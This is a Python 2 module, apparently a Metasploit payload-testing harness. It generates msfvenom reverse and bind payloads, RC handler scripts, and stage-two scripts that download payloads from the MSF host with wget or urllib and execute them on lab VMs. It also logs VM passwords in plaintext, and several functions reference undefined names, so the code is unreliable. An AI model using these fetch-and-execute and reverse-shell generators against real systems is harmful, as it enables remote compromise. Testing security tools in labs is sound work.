from datetime import datetime
import os
import time
import json
from __builtin__ import False

#
# GOT TIRED OF TRACKING THIS DATA IN A LIST
# 
class OLDpayloadData:
    def __init__(self, msfHost, targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent):
        self.msfHost =          msfHost         # THE msfHost HANDLING THE PAYLOAD
        self.targetIp =         targetVmIp      #THE IP ADDRESS OF THE TARGET
        self.payloadName =      payloadName     
        self.payloadType =      payloadType
        self.venomCmd =         venomCmd
        self.rcScriptName =     rcScriptName
        self.rcScriptContent =  rcScriptContent

class portValue:
    """
    THE BELOW portValue CLASS IS HOW I DECIDED TO TRACK THE PORT NUMBERS
    I WANTED A SINGLETON, BUT I FOUND NOTHING IN PYTHON THAT DID THAT.
    THIS CLASS LETS ME SIMPLY CALL get.portValue() AND IT RETURNS A 
    UNIQUE PORT VALUE, SO I DO NOT HAVE TO TRACK WHICH VALUES HAVE BEEN USED.
    """
    def __init__(self, initialValue):
        self.portNumber = initialValue
        
    def get(self):
        self.portNumber = self.portNumber + 1
        return self.portNumber

def loadJson(fileName):
    """
    READ IN THE JSON FILES AND RETURN A DICTIONARY
    GOT TIRED OF WRITING THE TRY/CATCH BLOCKS IN A COUPLE PLACES
    """
    retDict = None
    try:
        fileObj = open(fileName, 'r')
        jsonStr = fileObj.read()
        fileObj.close()
    except IOError as e:
        logMsg("FAILED TO FIND JSON FILE " + fileName + "\n" + str(e))
        return retDict
    try:
        retDict = json.loads(jsonStr)
    except ValueError as f:
        logMsg("FAILED TO PARSE JSON FILE " + fileName + "\n" + str(f))
    return retDict

def makeHtmlReport(targetData, msfHosts):
    htmlString = "<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>MSF_HOST NAME</td><td>MSF_HOST IP</td><td>MSF COMMIT VERSION</td></tr>\n"
    for msfHost in msfHosts:
        htmlString = htmlString + "<tr><td>" + msfHost['NAME'] + "</td><td>" + msfHost['IP_ADDRESS'] + "</td><td>" + msfHost['COMMIT_VERSION'] + "</td></tr>\n"
    htmlString = htmlString + "</table>\n"
    htmlString = htmlString + "<table border=\"1\">\n<tr><td>TARGET</td><td>TYPE</td><td>MSF_HOST</td><td>EXPLOIT</td><td>PAYLOAD</td><td>STATUS</td><td>SESSION</td></tr>\n"
    passedString = "<td bgcolor = \"#00cc00\">PASSED</td>"
    failedString = "<td bgcolor = \"#cc0000\">FAILED</td>"
    for host in targetData:
        stageTwoFileName = "NONE?"
        if 'STAGE_TWO_FILENAME' in host:
            stageTwoFileName = host['STAGE_TWO_FILENAME']
        for sessionData in host['SESSION_DATASETS']:
            payloadFileName = "NONE?"
            if 'FILENAME' in sessionData['PAYLOAD']:
                payloadFileName = sessionData['PAYLOAD']['FILENAME']
            htmlString = htmlString + "<tr><td>" + host['NAME'] + "<br>" + host['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + host['TYPE'] + "</td>" + \
                                    "<td>" + sessionData['MSF_HOST']['NAME'] + "<br>" + sessionData['MSF_HOST']['IP_ADDRESS'] + "</td>" + \
                                    "<td>" + sessionData['EXPLOIT']['NAME'] + "</td>" + \
                                    "<td>" + sessionData['PAYLOAD']['NAME'] + "<br>" + payloadFileName + "</td>"
            if 'STATUS' in sessionData:
                if sessionData['STATUS']:
                    htmlString = htmlString + "<td bgcolor = \"#00cc00\">PASSED</td>\n"
                else:
                    htmlString = htmlString + "<td bgcolor = \"#cc0000\">FAILED</td>\n"
            else:
                htmlString = htmlString + "<td> NO STATUS LISTED?</td>\n"
            htmlString = htmlString + "<td><a href=" + sessionData['LOCAL_SESSION_FILE'] + ">SESSION CONTENT</a></td></tr>\n"

    htmlString = htmlString + "</table>\n</body>\n</html>\n"
    return htmlString

def OLDmakeBindLaunchScript(devVmIp, msfPath, testVms, httpPort, scriptName):
    """
    makeBindLaunchScript CREATES A BASH SCRIPT TO LAUNCH THE BIND CALL-INS
    WITH THE CREATED RC SCRIPTS
    """
    scriptContent = "#!/bin/bash -l \n\n"
    scriptContent = scriptContent + "cd " + msfPath + "\n"
    for i in testVms:
        for j in i.payloadList:
            #ADD COMMENT AND LINE BREAK FOR READABILITY
            scriptContent = scriptContent + '\n\n##########################\n#' + j.payloadName + '\n#\n'
            if 'bind' in j.payloadName.lower(): 
                scriptContent = scriptContent + './msfconsole -qr '+ j.rcScriptName + ' > ' + j.rcScriptName + '.out &\n'
                scriptContent = scriptContent + 'sleep 1 > ' + j.rcScriptName + '.out &\n'
    bindScript = open(scriptName, 'wb')
    bindScript.write(scriptContent)
    bindScript.close()

    
def OLDmakeAndHostPayloads(configfData):
    """
     makeAndHostPayloads CREATES A BASH SCRIPT TO:
     -CREATE A TEMPORARY PAYLOAD DIRECTORY
     -CREATE THE REQUIRED MSFPAYLOADS FROM THE COMMANDS IN THE PAYLOADS LIST
     -MOVE THE PAYLOADS INTO THE TEMP DIRECTORY
     -CREATE THE RESOURCE SCRIPTS FOR THE HANDLERS
     -START THE REVERSE PAYLOAD HANDLERS
     -START AN HTTP SERVER TO SERVE THE PAYLOADS TO THE TEST VMS
    """
    logMsg("GENERATING PAYLOAD CREATION/REVERSE HANDLER SCRIPT")
    scriptContent = "#!/bin/bash -l \n\n"
    scriptContent = scriptContent + "cd " + msfPath + "\n"
    scriptContent = scriptContent + "mkdir test_payloads\n"
    scriptContent = scriptContent + "git fetch --all\n"
    scriptContent = scriptContent + "git pull\n"
    scriptContent = scriptContent + "git log | head -n 1 > " + commitFileName + "\n"
    scriptContent = scriptContent + "gem install bundler\n"
    scriptContent = scriptContent + "bundle install\n"
    """
     FOR EVERY PAYLOAD, ADD SCRIPT CONTENT TO:
     - CREATE PAYLOAD
     - GENERATE CUSTOM RC SCRIPT TO HANDLE SESSION CREATION AND TESTING
     - MOVE PAYLOAD TO TEMPORARY DIRECTORY
     - LAUNCH HANDLER IF PAYLOAD IS A REVERSE PAYLOAD
    """
    for i in testVms:
        for j in i.payloadList:
            #ADD COMMENT AND LINE BREAK FOR READABILITY
            scriptContent = scriptContent + '\n\n##########################\n#' + j.payloadName + '\n#\n'
            #ADD MSFVENOM PAYLOAD CREATION COMMAND
            scriptContent = scriptContent + './' + j.venomCmd + '\n'
            #ADD BASH CONTENT TO GENERATE RC SCRIPT FOR PAYLOAD
            scriptContent = scriptContent + j.rcScriptContent.strip() + '\n'
            #MOVE PAYLOAD TO TEMP DIRECTORY
            scriptContent = scriptContent + 'mv ' + j.payloadName +' ./test_payloads/'+ j.payloadName + '\n'
            #LAUNCH REVERSE HANDLERS IN RC SCRIPT
            if 'reverse' in j.payloadName.lower(): 
                scriptContent = scriptContent + './msfconsole -qr '+ j.rcScriptName + ' > ' + j.rcScriptName + '.out &\n'
                scriptContent = scriptContent + 'sleep 2\n'
        
    scriptContent = scriptContent + "cd test_payloads\n"
    """
    SERVE PAYLOADS
    """
    scriptContent = scriptContent + "python -m SimpleHTTPServer " + str(httpPort) + " &\n"
    """
    WRITE SCRIPT TO FILE
    """
    venomScript = open(scriptName, 'wb')
    venomScript.write(scriptContent)
    venomScript.close()
    logMsg("PAYLOAD CREATION/REVERSE HANDLER SCRIPT SAVED AS: " + scriptName)

def makeVenomCmd(targetData, sessionData, portTracker, logFile):
    payloadData = sessionData['PAYLOAD']
    payloadType = payloadData['NAME']
    payloadFileName = payloadData['FILENAME']
    msfHostData = sessionData['MSF_HOST']
    """
    WHAT FILE EXTENSION SHOULD WE USE?
    """
    execFormat = ''
    if 'windows' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".exe"
        execFormat = ' -f exe '
    elif 'mettle' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".elf"
        execFormat = ' -f elf '
    elif 'python' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".py"
    elif 'java' in payloadData['NAME'].lower():
        payloadFileName = payloadFileName + ".jar"
    else:
        logMsg(logFile, "UNKNOWN PAYLOAD TYPE: " + payloadData['NAME'].lower())
    payloadData['FILENAME'] = payloadFileName
    logMsg(logFile, "PAYLOAD FILENAME = " + payloadData['FILENAME'])
    msfVenomCmd = "./msfvenom -p " + payloadData['NAME'] + execFormat + " -o " + payloadData['FILENAME']
    # ADD HOST DATA
    if 'bind' in payloadType.lower():
        msfVenomCmd = msfVenomCmd + " RHOST=" + targetData['IP_ADDRESS'] + " RPORT=" + str(payloadData['PRIMARY_PORT'])
    else:
        msfVenomCmd = msfVenomCmd + " LHOST=" + msfHostData['IP_ADDRESS'] + " LPORT=" + str(payloadData['PRIMARY_PORT'])
    for settingEntry in payloadData['SETTINGS']:
        msfVenomCmd = msfVenomCmd + " " + settingEntry
    logMsg(logFile, "msfvenom cmd = " + msfVenomCmd)
    return msfVenomCmd

def OLDmakeUploadMsfHostRcScript(cmdList, msfHostData, targetData, payloadData, logFile):
    exploitPayloadPair = {}
    exploitData = {}
    exploitData['NAME'] = 'exploit/multi/handler'
    exploitData['SETTINGS'] = []
    exploitPayloadPair['EXPLOIT_MODULE'] = exploitData
    exploitPayloadPair['PAYLOAD'] = payloadData
    return makeExploitMsfHostRcScript(cmdList, msfHostData, targetData, sessionData, logFile)

def makeRcScript(cmdList, targetData, sessionData, logFile):
    rcScriptContent =   "# HANDLER SCRIPT FOR \n" + \
                    "# EXPLOIT:  " + sessionData['EXPLOIT']['NAME'] + "\n" + \
                    "# PAYLOAD:  " + sessionData['PAYLOAD']['NAME'] + "\n" + \
                    "# TARGET:   " + targetData['NAME'] + ' [' + targetData['IP_ADDRESS'] +"]\n" + \
                    "# MSF HOST: " + sessionData['MSF_HOST']['IP_ADDRESS'] + "\n"
    rcScriptName = sessionData['RC_IN_SCRIPT_NAME']
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'use " + sessionData['EXPLOIT']['NAME'] + " ' > " + rcScriptName + "\n"
    if sessionData['EXPLOIT']['NAME'] != 'exploit/multi/handler':
        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + " ' >> " + rcScriptName + "\n"
    for settingItem in sessionData['EXPLOIT']['SETTINGS']:
        rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'set payload " + sessionData['PAYLOAD']['NAME'] +"' >> " + rcScriptName + '\n'
    for settingItem in sessionData['PAYLOAD']['SETTINGS']:
        rcScriptContent = rcScriptContent + "echo 'set " + settingItem.split('=')[0] + ' ' + settingItem.split('=')[1] + "' >> " + rcScriptName + '\n'
    if 'bind' in sessionData['PAYLOAD']['NAME']:
        rcScriptContent = rcScriptContent + "echo 'set RHOST " + targetData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
    if 'reverse' in sessionData['PAYLOAD']['NAME']:
        rcScriptContent = rcScriptContent + "echo 'set LHOST " + sessionData['MSF_HOST']['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
        rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(sessionData['PAYLOAD']['PRIMARY_PORT']) + "' >> " + rcScriptName + '\n'
    for settingEntry in sessionData['PAYLOAD']['SETTINGS']:
        if '=' in settingEntry:
            strSetting = "SET " + settingEntry.split('=')[0] + " " + settingEntry.split('=')[1]
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    for i in cmdList:
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return rcScriptContent

def OLDmakeExploitMsfHostRcScript(cmdList, msfHostData, targetData, payloadData, logFile):
    rcScriptName = payloadData['RC_SCRIPT_NAME']
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = "# HANDLER SCRIPT FOR " + payloadData['VENOM_CMD'] +" \n"
    rcScriptContent = rcScriptContent + "echo 'use exploit/multi/handler ' > " + rcScriptName + "\n"
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set payload " + payloadData['NAME'] +"' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    if 'bind' in payloadData['NAME']:
        rcScriptContent = rcScriptContent + "echo 'set RHOST " + msfHostData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
        if 'UPLOAD' in msfHostData['METHOD']:
            rcScriptContent = rcScriptContent + "echo 'set RPORT " + str(payloadData['PORT']) + "' >> " + rcScriptName + '\n'
    if 'reverse' in payloadData['NAME']:
        rcScriptContent = rcScriptContent + "echo 'set LHOST " + msfHostData['IP_ADDRESS'] + "' >> " + rcScriptName + '\n'
        if 'UPLOAD' in msfHostData['METHOD']:
            rcScriptContent = rcScriptContent + "echo 'set LPORT " + str(payloadData['PORT']) + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    for settingEntry in payloadData['SETTINGS']:
        if '=' in settingEntry:
            strSetting = "SET " + settingEntry.split('=')[0] + " " + settingEntry.split('=')[1]
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    for i in cmdList:
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return rcScriptContent

    

"""
makeMetCmd()
CREATES A TUPLE MADE UP OF
- THE PAYLOAD FILENAME
- THE VENOM COMMAND TO CREATE THE PAYLOAD
- THE NAME OF THE RC SCRIPT TO RUN THE CUSTOM HANDLER
- THE TEXT FOR A CUSTOM RC SCRIPT TO SET UP THE CONNECTION AND TEST THE PAYLOAD
"""

def OLDmakeMetCmd(payloadType, msfIp, targetVmIp, metPort, cmdList):
    """
    makeMetCmd CREATES THE REQUIRED msfvenom COMMANDS AND RC SCRIPT
    FILES FOR THE PAYLOADS AND OSs LISTED
    """
    hostType = ""
    targetId = 'x'.join(targetVmIp.split('.'))
    """
    BIND OR REVERSE_TCP?
    """
    if 'bind' in payloadType.lower():
        payloadIp = targetVmIp
        hostType = "RHOST"
    else:
        payloadIp = msfIp
        hostType = "LHOST"

    """
    PATCHUP METERPRETER?
    """
    if 'patch' in payloadType.lower():
        payloadName = targetId + "_patchup_" + payloadType.split('/')[-1] + "_" + metPort + "_" + payloadIp.split('.')[3]
    else:
        payloadName = targetId + "_" + payloadType.split('/')[-1] + "_" + metPort + "_" + payloadIp.split('.')[3]
    rcScriptName = payloadName + '.rc'
    
    """
    WHAT FILE EXTENSION SHOULD WE USE?
    """
    if 'windows' in payloadType.lower():
        payloadName = payloadName + ".exe"
        execFormat = '-f exe'
    elif 'python' in payloadType.lower():
        payloadName = payloadName + ".py"
        execFormat = ''
    elif 'java' in payloadType.lower():
        payloadName = payloadName + ".jar"
        execFormat = ''
    elif 'mettle' in payloadType.lower():
        payloadName = payloadName + ".elf"
        execFormat = '-f elf'
    else:
        logMsg("UNKNOWN PAYLOAD TYPE: " + payloadType.lower())
        payloadName = payloadName
        execFormat = ''
        
    venomCmd = "msfvenom -p " + payloadType + " " + execFormat 
    venomCmd = venomCmd + " -o " +payloadName + " LHOST=" + payloadIp + " LPORT=" + metPort
    if 'rc4' in payloadType.lower():
        venomCmd = venomCmd + " RC4PASSWORD=secret"
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'

    rcScriptContent = "# HANDLER SCRIPT FOR " + venomCmd +" \n"
    rcScriptContent = rcScriptContent + "echo 'use exploit/multi/handler ' > " + rcScriptName + "\n"
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set payload " + payloadType +"' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set " + hostType + " " + payloadIp + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set LPORT " + metPort + "' >> " + rcScriptName + '\n'
    if 'rc4' in payloadType.lower():
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo 'set RC4PASSWORD secret' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    for i in cmdList:
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return payloadData(targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent)

def makeStageTwoShScript(targetData, payloadPort):
    stageTwoShContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoShContent = shTestScript + "cd " + targetData['PAYLOAD_PATH'] + " \n"
    for payloadData in targetData['PAYLOADS']:
        url = "'http://" + payloadData['MSF_HOST_IP'] + ":" + str(payloadPort) + "/" + payloadData['PAYLOAD_FILENAME'] + "'"
        stageTwoShContent = stageTwoShContent + "\nwget " + url + "\n"
        stageTwoShContent = stageTwoShContent + "sleep 5 \n"
        stageTwoShContent = stageTwoShContent + "chmod 755 " + payloadData['NAME'] + "\n"
        if '.py' in payloadData['NAME']:
            stageTwoShContent = stageTwoShContent + "python " + payloadData.payloadName + "&\n"
        elif '.jar' in payloadData['NAME']:
            stageTwoShContent = stageTwoShContent + "java -jar " + payloadData.payloadName + "&\n"
        elif '.elf' in payloadData['NAME']:
            stageTwoShContent = stageTwoShContent + "./" + payloadData.payloadName + "&\n"
    return stageTwoShContent

def makeStageTwoPyScript(targetData, httpPort):
    stageTwoPyContent = "# AUTOGENERATED TEST SCRIPT \n"
    stageTwoPyContent = stageTwoPyContent + "import subprocess\n"
    stageTwoPyContent = stageTwoPyContent + "import time\n"
    stageTwoPyContent = stageTwoPyContent + "import tempfile\n"
    stageTwoPyContent = stageTwoPyContent + "import urllib\n\n"
    
    """
    functionally, we need to create the following code for each payload:
    Download it
      url = 'http://<devVmIp>:<httpPort>/<payloadName>'
      filename = '<payloadName>'
      urllib.urlretrieve(url, filename)
    execute it
    """
    for sessionData in targetData['SESSION_DATASETS']:
        msfIpAddress = sessionData['MSF_HOST']['IP_ADDRESS']
        payloadFile = sessionData['PAYLOAD']['FILENAME']
        stageTwoPyContent = stageTwoPyContent + "url = 'http://" + msfIpAddress + ":" + str(httpPort) + "/" + payloadFile + "'\n"
        stageTwoPyContent = stageTwoPyContent + "fileName = r'" + targetData['PAYLOAD_DIRECTORY'] + '\\' + payloadFile + "'\n"
        if '.py' in payloadFile:
            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['PYTHON_PATH'] +"', fileName]\n"
        elif 'jar' in payloadFile:
            stageTwoPyContent = stageTwoPyContent + "cmdList = [r'" + targetData['JAVA_PATH'] + "','-jar', fileName]\n"
        else:
            stageTwoPyContent = stageTwoPyContent + "cmdList = [fileName]\n"
        stageTwoPyContent = stageTwoPyContent + "try:\n"
        stageTwoPyContent = stageTwoPyContent + "  urllib.urlretrieve(url, fileName)\n"
        stageTwoPyContent = stageTwoPyContent + "  subprocess.Popen(cmdList)\n"
        stageTwoPyContent = stageTwoPyContent + "except IOError as ioexep:\n"
        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), ioexep\n"
        stageTwoPyContent = stageTwoPyContent + "except WindowsError as winerr:\n"
        stageTwoPyContent = stageTwoPyContent + "  print 'Error when launching ' + str(cmdList), winerr\n"
        stageTwoPyContent = stageTwoPyContent + "except:\n"
        stageTwoPyContent = stageTwoPyContent + "  print 'God only knows what happened'\n"
        stageTwoPyContent = stageTwoPyContent + "time.sleep(5)\n"
    return stageTwoPyContent

def OLDgenerateReport(fileList, testVmList, reportFileName, sessionDir, commitVersion):
    reportFile = open(reportFileName, 'wb')
    for i in testVmList:
        for j in i.payloadList:
            try:
                logMsg(str(i.resultDict[j.payloadType]))
            except ValueError as e:
                logMsg(e + "WAS NOT FOUND")
                continue
            if i.resultDict[j.payloadType]:
                testResult = "PASSED"
            else:
                testResult = "FAILED"
            reportFile.write("################################################################################\n")
            reportFile.write("#\n")
            reportFile.write("#                IP ADDRESS:   " + j.targetVmIp + '\n')
            reportFile.write("#                VM NAME:      " + i.vmName + '\n')
            reportFile.write("#                PAYLOAD TYPE: " + j.payloadType + '\n')
            reportFile.write("#                COMMIT:       " + commitVersion + '\n')
            reportFile.write("#                TEST RESULT:  " + testResult + '\n')
            reportFile.write("#\n")
            reportFile.write("################################################################################\n")
            if sessionDir + "/" + j.rcScriptName + '.out' in fileList:
                outFile = open(sessionDir + "/" + j.rcScriptName + '.out', 'r')
                fileContent = outFile.readlines()
                outFile.close()
                for j in fileContent:
                    reportFile.write(j)
                reportFile.write("\n\n")
            else:
                print "CANNOT FIND FILE " + sessionDir + "/" + j.rcScriptName + '.out'
                reportFile.write("!!!!!!!!!!!!!!!!!!! MISSING !!!!!!!!!!!!!!!!!!!!!!!!!\n\n")
    reportFile.close()
    return reportFileName

def OLDpopulateResults(fileList, testVmList, dataDict):
    payloadResults = {}
    successList = dataDict['SUCCESS_LIST']
    sessionDir = dataDict['SESSION_DIR']
    for i in testVmList:
        payloadResults[i.vmName] = {}
        for j in i.payloadList:
            testsPassed = True
            sessionFile = sessionDir + "/" + j.rcScriptName + '.out'
            failedArtifacts = []
            if sessionFile in fileList:
                try:
                    outFile = open(sessionDir + "/" + j.rcScriptName + '.out', 'r')
                    fileContent = outFile.read()
                    outFile.close()
                except IOError as e:
                    logMsg("SESSION DUMP FILE: " + sessionFile + " SHOULD BE THERE, BUT IS NOT")
                    logMsg("SYSTEM ERROR:\n" + str(e))
                    continue
                for k in successList:
                    if k not in fileContent:
                        logMsg(i.vmName + ":" + str(j.payloadType) + " FAILED: " + k)
                        failedArtifacts.append(k)
                        testsPassed = False
            else:
                logMsg("COULD NOT FIND SESSION DUMP FILE: " " ")
                testsPassed = False
            i.resultDict[j.payloadType] = testsPassed
            payloadResults[i.vmName][j.payloadType] = failedArtifacts
            logMsg(str(i.resultDict))
    return payloadResults

def OLDprintResults(testVmList):
    for i in testVmList:
        for j in i.payloadList:
            if i.resultDict[j.payloadType]:
                logMsg('[PASSED]' + i.vmName + ':' + str(j.payloadType))
            else:
                logMsg('[FAILED]' + i.vmName + ':' + str(j.payloadType))

def OLDgenerateHtmlReport(resultsDic, fileName, testVms, commitVersion, dataDict):
    payloadTypes =  dataDict['PAYLOAD_LIST']
    testName =      dataDict['TEST_NAME']
    
    vmList = []
    htmlStr = "<html>\n<head>\n<title>\n\t" + testName + "\n</title>\n</head>\n\n<body>\n"        
    if ('TEST_PYTHON_EXE' in dataDict):
        htmlStr = htmlStr + "<BR> PYTHON EXE PATH: " + dataDict['TEST_PYTHON_EXE'] + "<BR>\n"
    if ('TEST_JAVA_EXE' in dataDict):
        htmlStr = htmlStr + "<BR> JAVA EXE PATH: " + dataDict['TEST_JAVA_EXE'] + "<BR>\n"
    htmlStr = htmlStr + "<table border=\"1\">\n"
    htmlStr = htmlStr + "<tr><td><center><strong>" + testName + "<BR>" + commitVersion + "</strong></td>"
    for vm in resultsDic:
        htmlStr = htmlStr + "<td>" + vm + "</td>"
        vmList.append(vm)
    for payload in payloadTypes:
        htmlStr = htmlStr + "<tr>\n\t<td>" + payload + "</td>"
        for operatingSystem in vmList:
            try:
                if len(resultsDic[operatingSystem][payload]) == 0:
                    htmlStr = htmlStr + "\t<td bgcolor = \"#00cc00\">PASSED</td>\n"
                else:
                    htmlStr = htmlStr + "\t<td bgcolor = \"#cc0000\">FAILED"
                    for failureArtifact in resultsDic[operatingSystem][payload]:
                        htmlStr = htmlStr + "<BR>" + failureArtifact
                    htmlStr = htmlStr + "\t</td>"
            except KeyError:
                htmlStr = htmlStr + "\t<td bgcolor = \"#7D7D7D\">NA</td>\n"
        htmlStr = htmlStr + "</tr>\n"
    htmlStr = htmlStr + "</table>\n</body>\n</html>\n"
    try:
        fileObj = open(fileName, 'wb')
        fileObj.write(htmlStr)
        fileObj.close()
    except IOError:
        return False
    return True

def OLDmakeWebResults(testVmList, fileName):
    try:
        fileObj = open(fileName, 'wb')
    except IOError:
        return False
    fileObj.write("<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n")
    fileObj.write("<table border=\"1\">\n<tr><td>PAYLOAD</td><td>VIRTUAL MACHINE</td><td>STATUS</td></tr>\n")
    for i in testVmList:
        for j in i.payloadList:
            if i.resultDict[j.payloadType]:
                fileObj.write("<tr> " + \
                              "<td>" + str(j.payloadType) + "</td>" + \
                              "<td>" + i.vmName + "</td>" + \
                              "<td bgcolor = \"#00cc00\">PASSED</td></tr>\n")
            else:
                fileObj.write("<tr>" + \
                              "<td>" + str(j.payloadType) + "</td>" + \
                              "<td>" + i.vmName + "</td>" + \
                              "<td bgcolor = \"#cc0000\">FAILED</td></tr>\n")
    fileObj.write("</table>\n</body>\n</html>\n")
    fileObj.close()
    return True

def getListFromFile(fileName):
    retList = []
    logMsg("GETTING COMMANDS FROM " + str(fileName))
    if fileName != None:
        with open(fileName, 'r') as fileObj:
            for i in fileObj.readlines():
                if '#' != i.strip()[0]:
                    retList.append(i.strip())
    logMsg(str(retList))
    return retList

def logMsg(logFile, strMsg):
    if strMsg == None:
        strMsg="[None]"
    dateStamp = 'testlog:[' + str(datetime.now())+ '] '
    #DELETE THIS LATER:
    print dateStamp + str(strMsg)
    try:
        logFileObj = open(logFile, 'ab')
        logFileObj.write(dateStamp + strMsg +'\n')
        logFileObj.close()
    except IOError:
        return False
    return True
  
    
def selectVms(vmList, posFilter=None):
    menuVms = []
    selectedVmList = []
    for i in vmList:
        if (posFilter == None) or (posFilter.upper() in i.vmIdentifier.upper()):
            menuVms.append(i)
    for i in range(len(menuVms)):
            print str(i) + " " + menuVms[i].vmIdentifier  
    feedBack = raw_input(">> ")
    print "SELECTION: " + feedBack +'\n'
    feedbackList = feedBack.split(',')
    for i in feedbackList:
        selectedVmList.append(menuVms[int(i)])
    return selectedVmList

def findAndConfigVms(vmList, vmDataList):
    foundVmList = []
    for vmData in vmDataList:
        try:
            vmName =        vmData['VM_NAME']
            vmUsername =    vmData['VM_USERNAME']
            vmPassword =    vmData['VM_PASSWORD']
        except KeyError as e:
            logMsg("[JSON PARSE ERROR]: COULD NOT FIND VALUE " + \
                    str(e))
            continue
        for j in vmList:
            if vmName.lower() in j.vmName.lower():
                foundVmList.append(j)
                logMsg("ADDING USERNAME " + vmUsername + " PASSWORD " + vmPassword + " TO " + vmName + " : " + j.vmName)
                j.setPassword(vmPassword)
                j.setUsername(vmUsername)
    return foundVmList
